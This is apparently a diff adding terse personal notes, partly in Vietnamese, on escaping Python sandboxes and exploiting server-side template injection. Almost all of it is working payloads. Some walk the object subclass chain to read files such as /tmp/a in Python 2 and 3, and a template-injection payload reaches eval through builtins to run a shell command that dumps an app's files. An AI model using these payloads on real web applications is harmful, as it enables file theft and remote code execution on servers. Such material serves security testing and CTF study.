@@ -1,3 +1,20 @@
+* python2
+- read, write file
+<type 'file'>
+''.__class__.__mro__[2].__subclasses__()[40]('/tmp/a').read()
+[].__class__.__base__.__subclasses__()[40]('/tmp/a').read()
+
+
+
+* python3
+- read, write file
+
+<class '_io._IOBase'> -> <class '_io._RawIOBase'> -> <class '_io.FileIO'> (index ko phai luc nao cung dung)
+''.__class__.__base__.__subclasses__()[84].__subclasses__()[0].__subclasses__()[0]('/tmp/a').read()
+
+- RCE
+<class 'warnings.catch_warnings'> -> __builtins__ -> eval/exec (dung eval vi exec tra ve None nen khong hien ket qua)
+{{ [1].__class__.__base__.__subclasses__()[157].__init__.__globals__['__builtins__']['eval']("__import__('subprocess').check_output('cd app;cat *; return 0;', shell=True, stderr=-2)") }}
 
 GET /?q5ca=id
 
